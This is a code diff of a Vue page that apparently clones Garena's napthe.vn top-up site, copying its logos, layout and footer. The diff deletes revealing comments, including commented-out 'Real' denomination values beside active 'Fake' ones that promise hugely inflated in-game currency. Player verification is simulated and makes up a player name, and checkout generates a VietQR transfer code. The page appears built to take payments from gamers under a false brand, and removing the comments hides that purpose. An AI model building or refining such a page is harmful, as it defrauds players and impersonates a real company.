@@ -1,7 +1,6 @@
 <script setup>
 import { ref, computed, watch, onMounted, onUnmounted } from 'vue';
 
-// --- State Management ---
 const selectedGame = ref('freefire');
 
 const selectGame = (gameId) => {
@@ -88,7 +87,6 @@ onUnmounted(() => {
     }
 });
 
-// Game List matching Image 2 100%
 const games = [
     {
         id: 'fcmobile',
@@ -149,24 +147,12 @@ const games = [
     },
 ];
 
-// Active game object
 const activeGame = computed(() => {
     return games.find((g) => g.id === selectedGame.value) || games[2];
 });
 
-// Denominations matching official napthe.vn layout (exact values from screenshot)
 const denominations = [
-    // Real
-    // { amount: 5000, items: 25 },
-    // { amount: 10000, items: 51 },
-    // { amount: 20000, items: 113 },
-    // { amount: 50000, items: 283 },
-    // { amount: 100000, items: 566 },
-    // { amount: 200000, items: 1132 },
-    // { amount: 500000, items: 2830 },
-    // { amount: 1000000, items: 5750 },
-    // { amount: 2000000, items: 11500 },
-    // Fake
+    
     { amount: 50000, items: 14150 },
     { amount: 100000, items: 28300 },
     { amount: 200000, items: 56600 },
@@ -283,7 +269,6 @@ const currentSoAmount = computed(() => {
     return selectedDenomination.value ? Math.floor(selectedDenomination.value / 500) : 0;
 });
 
-// Payment methods matching sample screenshot 100%
 const availablePaymentMethods = [
     { id: 'shopeepay', name: 'Ví ShopeePay', icon: '/img/payment/vnpay.png'},
     { id: 'garenaso', name: 'Garena Sò', icon: '/img/payment/sò.png' },
@@ -302,7 +287,6 @@ const selectedPaymentObj = computed(() => {
     return paymentMethods.value.find((p) => p.id === selectedPayment.value) || null;
 });
 
-// Handle Verification
 const handleVerifyPlayer = () => {
     playerError.value = '';
     const trimmedId = String(playerId.value || '').trim();
@@ -327,7 +311,6 @@ const handleVerifyPlayer = () => {
         verifiedPlayerName.value = `Garena_Player_${prefix}`;
         showLoginModal.value = false;
 
-        // If login was performed inside the Login Modal and amount & payment method are selected, redirect to checkout
         if (isFromModal && currentAmount.value && selectedPayment.value) {
             checkoutPaymentCode.value = generatePaymentCode();
             viewState.value = 'checkout';
@@ -388,7 +371,7 @@ const handleGarenaCardTab = () => {
     return;
 };
 
-const viewState = ref('form'); // 'form' | 'checkout' | 'loading' | 'success'
+const viewState = ref('form'); 
 
 const qrCodeUrl = computed(() => {
     return getVietQrUrl(currentAmount.value || 50000, checkoutPaymentCode.value);
@@ -409,7 +392,6 @@ const copyText = async (text) => {
     }
 };
 
-// Handle Recharge Submission -> Redirects to Checkout Payment View with VietQR
 const handleRecharge = () => {
     cardError.value = '';
     if (!isPlayerVerified.value) {
@@ -509,18 +491,13 @@ document.addEventListener('keydown', function (e) {
 
 <template>
     <div class="napthe-official-app">
-        <!-- Accessible Skip Link (WCAG 2.2 AA) -->
         <a href="#main-content" class="skip-link">Bỏ qua đến nội dung chính</a>
-
-        <!-- Header Bar matching DevTools screenshot & Image 2 -->
         <header class="top-header border-b border-[#e5e7eb] bg-white md:h-[60px]" role="banner">
             <div
                 class="header-inner mx-auto flex h-full w-full max-w-5xl items-center justify-between gap-1 px-3 md:px-4">
                 <a class="flex items-center gap-2 md:gap-3 text-decoration-none" href="/">
                     <div class="flex items-center gap-2">
-                        <!-- Desktop Logo -->
                         <img src="/img/header/logo.png" alt="Garena Logo" class="garena-logo-img" />
-                        <!-- Mobile Logo (/garena.png) -->
                         <img src="/garena.png" alt="Garena Logo" class="garena-logo-img-mobile" />
                     </div>
                     <span class="header-divider" aria-hidden="true">|</span>
@@ -545,7 +522,7 @@ document.addEventListener('keydown', function (e) {
         </header>
 
         <template v-if="viewState === 'form'">
-            <!-- Top Marketing Banner Carousel Section (using /img/bannerMKT/banner_set_aov_267.png) -->
+            
             <section class="top-promo-banner-section" aria-label="Sự kiện khuyến mãi ShopeePay">
                 <div class="promo-banner-wrapper">
                     <img src="/img/bannerMKT/banner_set_aov_267.png" alt="Khuyến mãi ShopeePay Giảm 50k Napthe.vn"
@@ -553,7 +530,6 @@ document.addEventListener('keydown', function (e) {
                 </div>
             </section>
 
-            <!-- Game Selector Section ("Lựa chọn trò chơi") per DevTools screenshot -->
             <div class="game-selector-section bg-[#EFEFEF] dark:bg-[#333356]">
                 <nav class="relative w-full game-selector-nav" aria-label="Lựa chọn trò chơi">
                     <div
@@ -1279,7 +1255,7 @@ document.addEventListener('keydown', function (e) {
                 role="region" aria-label="Thanh toán cố định">
                 <div class="sticky-footer-inner">
                     <div class="sticky-summary-info">
-                        <!-- Line 1 -->
+                        
                         <div v-if="activeSubTab === 'shop'" class="summary-shop-title-row">
                             <span class="summary-shop-name">{{ selectedShopObject.name }}</span>
                         </div>
@@ -1320,24 +1296,19 @@ document.addEventListener('keydown', function (e) {
             </div>
         </transition>
 
-        <!-- Logout Confirmation Modal -->
         <LogoutModal :is-open="showLogoutModal" @close="showLogoutModal = false" @confirm="confirmLogout" />
 
-        <!-- Login Modal Component -->
         <LoginModal v-model:player-id="playerId" :is-open="showLoginModal" :active-game="activeGame"
             :player-error="playerError" :is-verifying-player="isVerifyingPlayer" @close="showLoginModal = false"
             @submit="handleVerifyPlayer" @open-howto="openHowtoModal" />
 
-        <!-- HowTo Guide Modal Component -->
         <HowtoModal v-model:show="showHowtoModal" />
 
-        <!-- SePay VietQR Payment Modal Component -->
         <SepayModal :show="showSepayModal" :amount="currentAmount || 50000" :game-name="activeGame?.name"
             :items="activeSubTab === 'shop' ? selectedShopObject?.name : `${activeDenom?.items} ${activeGame?.currencyName}`"
             :player-name="verifiedPlayerName || 'Gấu亗PK'" @close="showSepayModal = false"
             @success="handleSepaySuccess" />
 
-        <!-- Success Modal -->
         <div v-if="showSuccessModal" class="modal-overlay" role="dialog" aria-modal="true"
             aria-labelledby="modal-title">
             <div class="modal-box">
@@ -1379,7 +1350,6 @@ document.addEventListener('keydown', function (e) {
             </div>
         </div>
 
-        <!-- Official Napthe Footer -->
         <footer class="official-footer" role="contentinfo">
             <div class="footer-inner-container">
                 <div class="footer-company-info">
@@ -1458,7 +1428,6 @@ document.addEventListener('keydown', function (e) {
     box-sizing: border-box;
 }
 
-/* Accessibility Skip Link (WCAG 2.2 AA) */
 .skip-link {
     position: absolute;
     top: -100px;
@@ -1479,14 +1448,12 @@ document.addEventListener('keydown', function (e) {
     outline-offset: 2px;
 }
 
-/* Focus outline reset */
 :focus,
 :focus-visible {
     outline: none !important;
     box-shadow: none !important;
 }
 
-/* White Header per Image 2 & DESIGN.md */
 .top-header {
     background-color: #ffffff;
     height: 60px;
@@ -1592,7 +1559,6 @@ document.addEventListener('keydown', function (e) {
     opacity: 0.8;
 }
 
-/* Top Marketing Banner Section (Dark Full Width Section) */
 .top-promo-banner-section {
     background-color: #121212;
     padding: 16px 0;
@@ -1641,7 +1607,6 @@ document.addEventListener('keydown', function (e) {
     background: linear-gradient(90deg, #FF9800 0%, rgba(255, 152, 0, 0) 100%);
 }
 
-/* Game Selector Section ("Lựa chọn trò chơi") per DevTools snippet */
 .game-selector-section {
     position: relative;
     margin-top: -1px;
@@ -1720,8 +1685,6 @@ document.addEventListener('keydown', function (e) {
     display: flex;
 }
 
-/* Accent Bar - Diagonal Golden Strip above "Lựa chọn trò chơi" */
-/* Structure: flex-1(cam) | SVG 1024px (centered) | flex-1(vàng nhạt) */
 .accent-bar-container {
     top: 0;
     left: 0;
@@ -1733,10 +1696,10 @@ document.addEventListener('keydown', function (e) {
 }
 
 .accent-bar-left {
-    /* flex-1: tự động chiếm phần không gian còn lại bên trái SVG */
+    
     flex: 1 1 0%;
     height: 7px;
-    /* Chỉ cao 7px - phần cam đặc phía trên bên trái */
+    
     background-color: #f2b13e;
     align-self: flex-start;
 }
@@ -1749,7 +1712,7 @@ document.addEventListener('keydown', function (e) {
 }
 
 .accent-bar-right {
-    /* flex-1: tự động chiếm phần không gian còn lại bên phải SVG */
+    
     flex: 1 1 0%;
     height: 27px;
     background-color: rgba(253, 211, 115, 0.63);
@@ -1972,7 +1935,6 @@ document.addEventListener('keydown', function (e) {
     font-weight: 700;
 }
 
-/* Selected Game Banner Bar */
 .game-hero-banner-section {
     margin-top: 24px;
     margin-bottom: 24px;
@@ -2052,7 +2014,6 @@ document.addEventListener('keydown', function (e) {
     display: block;
 }
 
-/* Steps Styling */
 .step-section {
     margin-bottom: 24px;
 }
@@ -2084,7 +2045,6 @@ document.addEventListener('keydown', function (e) {
     color: var(--color-text-primary);
 }
 
-/* Step 1 Login Box */
 .step-content-card {
     background-color: #f9f9f9;
     border: 0.5px solid var(--color-border-default);
@@ -2346,7 +2306,6 @@ document.addEventListener('keydown', function (e) {
     color: #757575;
 }
 
-/* Step 2 Denomination Grid */
 .denom-tabs-row {
     display: flex;
     gap: 10px;
@@ -2462,7 +2421,6 @@ document.addEventListener('keydown', function (e) {
     line-height: 1;
 }
 
-/* Shop Packages Section */
 .shop-packages-section {
     margin-top: 10px;
 }
@@ -2555,7 +2513,6 @@ document.addEventListener('keydown', function (e) {
     color: #d81a0d;
 }
 
-/* Step 3 Payment Methods Grid */
 .payment-grid {
     display: grid;
     grid-template-columns: repeat(3, 1fr);
@@ -2595,7 +2552,6 @@ document.addEventListener('keydown', function (e) {
     border-color: #e5e7eb;
 }
 
-/* Step 3 Instruction Note Box */
 .payment-instruction-box {
     display: flex;
     align-items: flex-start;
@@ -2643,7 +2599,6 @@ document.addEventListener('keydown', function (e) {
     line-height: 1.2;
 }
 
-/* Compact mode when 0d / no denomination selected (Image 2 style) */
 .payment-card-box.compact-mode {
     justify-content: flex-start;
     padding: 14px 18px;
@@ -2763,7 +2718,6 @@ document.addEventListener('keydown', function (e) {
     color: rgb(216, 26, 13);
 }
 
-/* Submit Action Row matching reference image 100% */
 .payment-bottom-action-wrapper {
     margin-top: 24px;
     display: flex;
@@ -2872,7 +2826,6 @@ document.addEventListener('keydown', function (e) {
     display: block;
 }
 
-/* Sticky Fixed Bottom Summary Footer Bar */
 .sticky-footer-bar {
     position: fixed;
     bottom: 0;
@@ -2911,7 +2864,6 @@ document.addEventListener('keydown', function (e) {
     opacity: 0;
 }
 
-/* Footer */
 .official-footer {
     background-color: #ffffff;
     border-top: 1px solid var(--color-border-default);
@@ -2959,7 +2911,6 @@ document.addEventListener('keydown', function (e) {
     color: var(--color-border-muted);
 }
 
-/* Modal */
 .modal-overlay {
     position: fixed;
     top: 0;
@@ -3035,7 +2986,6 @@ document.addEventListener('keydown', function (e) {
     color: #ffffff;
 }
 
-/* Responsive adjustments */
 @media (max-width: 900px) {
     .denom-grid {
         grid-template-columns: repeat(3, 1fr);
@@ -3062,7 +3012,6 @@ document.addEventListener('keydown', function (e) {
     }
 }
 
-/* Checkout Payment Page Styling matching user reference screenshot */
 .checkout-main-container {
     min-height: calc(100vh - 140px);
     padding: 30px 15px 50px 15px;
@@ -3302,7 +3251,6 @@ document.addEventListener('keydown', function (e) {
     cursor: not-allowed;
 }
 
-/* Loading View Styling matching User Screenshot */
 .loading-main-container {
     min-height: calc(100vh - 140px);
     padding: 80px 15px 60px 15px;
@@ -3390,7 +3338,6 @@ document.addEventListener('keydown', function (e) {
     background-color: rgb(216, 26, 13);
 }
 
-/* Inline Result View Styling (Replaces page view, NO Modal!) */
 .result-main-container {
     min-height: calc(100vh - 140px);
     padding: 40px 15px 60px 15px;
@@ -3509,7 +3456,6 @@ document.addEventListener('keydown', function (e) {
     z-index: 2;
 }
 
-/* Mobile Responsive Optimization for Game Selector Icons & Shop Grid */
 @media (max-width: 640px) {
     .garena-logo-img {
         display: none !important;
@@ -3596,7 +3542,6 @@ document.addEventListener('keydown', function (e) {
         column-gap: 6px !important;
     }
 
-    /* Mobile Game Selector Icon Size & Font Weight Optimization */
     .game-selector-btn {
         width: 100% !important;
         max-width: 76px !important;
@@ -3636,7 +3581,6 @@ document.addEventListener('keydown', function (e) {
         height: 105px !important;
     }
 
-    /* Hero Banner Mobile Height Reduction */
     .game-hero-banner-section {
         margin-top: 12px !important;
         margin-bottom: 12px !important;
@@ -3705,7 +3649,6 @@ document.addEventListener('keydown', function (e) {
         font-size: 14px !important;
     }
 
-    /* Denominations Mobile Font Size Optimization matching sample image (3 columns x 3 rows, min-h 50px) */
     @media (max-width: 768px) {
         .denom-grid {
             grid-template-columns: repeat(3, 1fr) !important;
@@ -3742,7 +3685,6 @@ document.addEventListener('keydown', function (e) {
         }
     }
 
-    /* Payment Methods Mobile Image & Card Size Optimization */
     .payment-grid {
         grid-template-columns: repeat(2, 1fr) !important;
         gap: 10px !important;
@@ -3815,7 +3757,6 @@ document.addEventListener('keydown', function (e) {
         padding: 1px 4px !important;
     }
 
-    /* Mobile Checkout Page Layout Optimization */
     .checkout-details-list {
         padding: 0 16px !important;
         gap: 12px !important;
@@ -3845,7 +3786,6 @@ document.addEventListener('keydown', function (e) {
         padding: 0 16px 24px 16px !important;
     }
 
-    /* Mobile Background Image & Result Illustration Optimization */
     .result-main-container,
     .checkout-main-container,
     .loading-main-container {
